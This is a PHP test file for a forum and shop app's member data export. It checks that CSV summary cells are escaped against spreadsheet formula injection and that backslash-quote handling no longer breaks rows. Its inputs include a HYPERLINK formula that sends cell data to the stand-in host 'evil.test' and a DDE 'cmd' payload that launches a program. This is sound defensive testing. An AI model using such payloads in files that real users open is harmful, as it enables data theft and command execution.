<?php

namespace Tests\Feature\Settings;

use App\Jobs\GenerateUserDataExport;
use App\Models\Blog;
use App\Models\BlogComment;
use App\Models\DataExport;
use App\Models\ForumBoard;
use App\Models\ForumCategory;
use App\Models\ForumPost;
use App\Models\ForumThread;
use App\Models\ModerationAction;
use App\Models\Product;
use App\Models\ProductReview;
use App\Models\SupportTicket;
use App\Models\User;
use Carbon\CarbonImmutable;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Notification;
use Illuminate\Support\Facades\Storage;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;
use ZipArchive;

/**
 * `export.csv` in a member's data export. Its summary column is what somebody typed (the member's own comment, post, ticket subject or key name, and
 * the reason a moderator gave and the name of a product, which others wrote), and a member opens the file in Excel, LibreOffice or Sheets, which run a
 * cell that starts with `=`, `+`, `-` or `@` as a formula (CWE-1236). The writer also used PHP's default escape character, which leaves a quote that
 * follows a backslash undoubled, so a comment with `\"` in it came out as a broken row.
 */
class DataExportCsvTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        $this->travelTo(CarbonImmutable::parse('2026-10-15 12:00:00'));
    }

    private const AT = '2026-10-15T12:00:00+00:00';

    /**
     * @return array{json: array<string, mixed>, raw: string, rows: list<list<string|null>>}
     */
    private function export(User $user): array
    {
        Storage::fake('local');
        Notification::fake();

        $export = DataExport::factory()->for($user)->create();
        (new GenerateUserDataExport($export->id))->handle();

        $zip = new ZipArchive;
        $this->assertTrue($zip->open(Storage::disk('local')->path($export->fresh()->file_path)) === true);
        $json = (string) $zip->getFromName('export.json');
        $csv = (string) $zip->getFromName('export.csv');
        $zip->close();

        return [
            'json' => json_decode($json, true, flags: JSON_THROW_ON_ERROR),
            'raw' => $csv,
            'rows' => $this->rows($csv),
        ];
    }

    /**
     * Read as RFC 4180 has it: a quote is doubled and there is no backslash escape.
     *
     * @return list<list<string|null>>
     */
    private function rows(string $csv): array
    {
        $stream = fopen('php://temp', 'r+');
        fwrite($stream, $csv);
        rewind($stream);

        $rows = [];
        while (($row = fgetcsv($stream, null, ',', '"', '')) !== false) {
            $rows[] = $row;
        }

        fclose($stream);

        return $rows;
    }

    private function comment(User $user, string $body): BlogComment
    {
        $blog = Blog::factory()->for($user)->create();

        return BlogComment::factory()->for($blog)->for($user)->create(['body' => $body]);
    }

    private function reply(User $user, string $body): ForumPost
    {
        $category = ForumCategory::create(['title' => 'General', 'slug' => 'general', 'description' => 'Chat', 'position' => 1]);
        $board = ForumBoard::create(['forum_category_id' => $category->id, 'title' => 'News', 'slug' => 'news', 'description' => 'News', 'position' => 1]);
        $thread = ForumThread::create([
            'forum_board_id' => $board->id,
            'user_id' => $user->id,
            'title' => 'A thread',
            'slug' => 'a-thread',
            'excerpt' => 'Thread',
            'is_locked' => false,
            'is_pinned' => false,
            'is_published' => true,
            'views' => 0,
        ]);

        return ForumPost::create(['forum_thread_id' => $thread->id, 'user_id' => $user->id, 'body' => $body]);
    }

    private function warning(User $user, string $reason): ModerationAction
    {
        return ModerationAction::factory()->create(['user_id' => $user->id, 'type' => ModerationAction::WARNING, 'reason' => $reason]);
    }

    #[Test]
    public function every_kind_of_row_is_what_it_always_was_for_ordinary_text(): void
    {
        $user = User::factory()->create();
        $comment = $this->comment($user, 'Nice post');
        $post = $this->reply($user, 'A reply');
        $ticket = SupportTicket::factory()->for($user)->create(['subject' => 'Where is my order?']);
        $product = Product::factory()->create(['name' => 'Widget']);
        $wish = $user->wishlistItems()->create(['product_id' => $product->id]);
        $review = ProductReview::factory()->for($product)->for($user)->pending()->create(['rating' => 2, 'title' => 'Meh', 'body' => 'Not what I hoped for.']);
        $key = $user->createToken('CI', ['profile:read', 'polls:vote'])->accessToken;
        $action = $this->warning($user, 'Please stop that');

        // As the writer has always written it: a cell with a space in it is put in quotes.
        $expected = implode("\n", [
            'resource_type,resource_id,summary,created_at,updated_at',
            "blog_comment,{$comment->id},\"Nice post\",".self::AT.','.self::AT,
            "forum_post,{$post->id},\"A reply\",".self::AT.','.self::AT,
            "support_ticket,{$ticket->id},\"Where is my order?\",".self::AT.','.self::AT,
            "wishlist_item,{$wish->id},Widget,".self::AT.','.self::AT,
            "product_review,{$review->id},\"2/5 Widget: Meh\",".self::AT.','.self::AT,
            "api_key,{$key->id},\"CI: profile:read polls:vote\",".self::AT.','.self::AT,
            "moderation_warning,{$action->id},\"Please stop that\",".self::AT.','.self::AT,
        ])."\n";

        $this->assertSame($expected, $this->export($user)['raw']);
    }

    #[Test]
    public function words_that_would_start_a_formula_are_made_text_whoever_wrote_them(): void
    {
        $user = User::factory()->create();
        $this->comment($user, '=1+1');
        $this->reply($user, '-3 degrees today');
        SupportTicket::factory()->for($user)->create(['subject' => '+1+1']);
        $product = Product::factory()->create(['name' => '-2+3']);
        $user->wishlistItems()->create(['product_id' => $product->id]);
        $user->createToken('=HYPERLINK("http://evil.test/?x="&A1,"click")', ['profile:read']);
        $this->warning($user, "=cmd|' /C calc'!A0");

        $summaries = array_column(array_slice($this->export($user)['rows'], 1), 2, 0);

        $this->assertSame([
            'blog_comment' => "'=1+1",
            'forum_post' => "'-3 degrees today",
            'support_ticket' => "'+1+1",
            'wishlist_item' => "'-2+3",
            'api_key' => "'=HYPERLINK(\"http://evil.test/?x=\"&A1,\"click\"): profile:read",
            'moderation_warning' => "'=cmd|' /C calc'!A0",
        ], $summaries);
    }

    #[Test]
    public function the_json_keeps_the_words_exactly_as_they_were_typed(): void
    {
        $user = User::factory()->create();
        $this->comment($user, '=1+1');
        $this->warning($user, "=cmd|' /C calc'!A0");

        $json = $this->export($user)['json'];

        $this->assertSame('=1+1', $json['blog_comments'][0]['body']);
        $this->assertSame("=cmd|' /C calc'!A0", $json['moderation'][0]['reason']);
    }

    #[Test]
    public function text_that_does_not_start_a_formula_is_not_changed(): void
    {
        $user = User::factory()->create();
        $this->comment($user, 'Ratings: 5 - 4 = 1, and me+you @ home');
        SupportTicket::factory()->for($user)->create(['subject' => 'Order 5 = shipped']);

        $summaries = array_column(array_slice($this->export($user)['rows'], 1), 2, 0);

        $this->assertSame([
            'blog_comment' => 'Ratings: 5 - 4 = 1, and me+you @ home',
            'support_ticket' => 'Order 5 = shipped',
        ], $summaries);
    }

    #[Test]
    public function a_quote_after_a_backslash_does_not_end_the_cell(): void
    {
        $user = User::factory()->create();
        $body = 'The path is C:\\"temp" and "that" is all';
        $this->comment($user, $body);

        $rows = $this->export($user)['rows'];

        $this->assertCount(2, $rows);
        $this->assertCount(5, $rows[1]);
        $this->assertSame($body, $rows[1][2]);
        $this->assertSame(self::AT, $rows[1][3]);
    }

    #[Test]
    public function a_comma_and_a_line_break_stay_in_their_cell(): void
    {
        $user = User::factory()->create();
        $body = "one, two\nthree \"four\"";
        $this->comment($user, $body);

        $rows = $this->export($user)['rows'];

        $this->assertCount(2, $rows);
        $this->assertSame($body, $rows[1][2]);
    }

    #[Test]
    public function every_kind_of_summary_is_cut_at_a_hundred_and_twenty_characters(): void
    {
        $long = str_repeat('a', 200);
        $user = User::factory()->create();
        $this->comment($user, $long);
        $this->reply($user, $long);
        SupportTicket::factory()->for($user)->create(['subject' => $long]);
        $product = Product::factory()->create(['name' => $long]);
        $user->wishlistItems()->create(['product_id' => $product->id]);
        ProductReview::factory()->for($product)->for($user)->pending()->create(['rating' => 5, 'title' => str_repeat('a', 100), 'body' => $long]); // the title column holds 120
        $user->createToken($long, ['profile:read']);
        $this->warning($user, $long);

        $summaries = array_column(array_slice($this->export($user)['rows'], 1), 2, 0);

        $this->assertSame(
            ['blog_comment', 'forum_post', 'support_ticket', 'wishlist_item', 'product_review', 'api_key', 'moderation_warning'],
            array_keys($summaries),
        );

        foreach ($summaries as $type => $summary) {
            $this->assertSame(123, strlen($summary), $type);
            $this->assertStringEndsWith('...', $summary, $type);
        }
    }

    #[Test]
    public function a_long_summary_is_cut_at_a_hundred_and_twenty_characters(): void
    {
        $user = User::factory()->create();
        SupportTicket::factory()->for($user)->create(['subject' => '='.str_repeat('a', 200)]);

        $summary = $this->export($user)['rows'][1][2];

        $this->assertSame("'=".str_repeat('a', 119).'...', $summary);
    }
}
